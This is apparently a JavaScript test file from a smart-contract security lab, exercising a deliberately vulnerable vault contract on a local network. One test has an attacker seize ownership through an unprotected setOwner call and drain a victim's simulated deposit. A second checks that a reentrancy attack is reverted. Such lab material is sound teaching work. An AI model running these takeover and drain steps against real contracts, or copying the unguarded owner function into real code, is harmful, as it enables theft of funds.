
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { network } from "hardhat";
import { parseEther } from "viem";

const { viem } = await network.connect();

describe("Guided Lab 3 - VulnerableVault attacks", () => {
  it("Activity 2: attacker takes ownership and drains vault", async () => {
    const [deployer, victim, attacker] =
      await viem.getWalletClients();

    const vault = await viem.deployContract("VulnerableVault");

    // Victim deposits 5 simulated ETH.
    await vault.write.deposit([], {
      account: victim.account,
      value: parseEther("5"),
    });

    const vaultBefore = await viem.getPublicClient().then(
      (client) => client.getBalance({ address: vault.address })
    );

    assert.equal(vaultBefore, parseEther("5"));

    // Vulnerability: anyone can change the owner.
    await vault.write.setOwner([attacker.account.address], {
      account: attacker.account,
    });

    const newOwner = await vault.read.owner();

    assert.equal(
      newOwner.toLowerCase(),
      attacker.account.address.toLowerCase()
    );

    // Attacker steals the vault's simulated ETH.
    await vault.write.sweep([attacker.account.address], {
      account: attacker.account,
    });

    const publicClient = await viem.getPublicClient();

    const vaultAfter = await publicClient.getBalance({
      address: vault.address,
    });

    assert.equal(vaultAfter, 0n);

    console.log("Access-control attack succeeded");
    console.log("Vault balance before:", vaultBefore.toString());
    console.log("Vault balance after:", vaultAfter.toString());
    console.log("Unauthorized owner:", newOwner);
  });
  
  it("Activity 3: reentrancy attempt is reverted by arithmetic checks", async () => {
    const [deployer, victim, attacker] =
      await viem.getWalletClients();

    const vault = await viem.deployContract("VulnerableVault");

    // Victim deposits 5 simulated ETH.
    await vault.write.deposit([], {
      account: victim.account,
      value: parseEther("5"),
    });

    // Deploy attacker contract targeting the vault.
    const reenterer = await viem.deployContract("Reenterer", [
      vault.address,
    ]);

    const publicClient = await viem.getPublicClient();

    const vaultBefore = await publicClient.getBalance({
      address: vault.address,
    });

    assert.equal(vaultBefore, parseEther("5"));

    // Reentrant withdrawal attempts to withdraw twice
    // before the attacker's balance is updated.
    await assert.rejects(
      async () => {
        await reenterer.write.attack([], {
          account: attacker.account,
          value: parseEther("1"),
        });
      }
    );

    // Reverted transactions must not change balances.
    const vaultAfter = await publicClient.getBalance({
      address: vault.address,
    });

    assert.equal(vaultAfter, vaultBefore);

    console.log("Reentrancy attempt reverted");
    console.log("Vault balance unchanged:", vaultAfter.toString());
  });

});
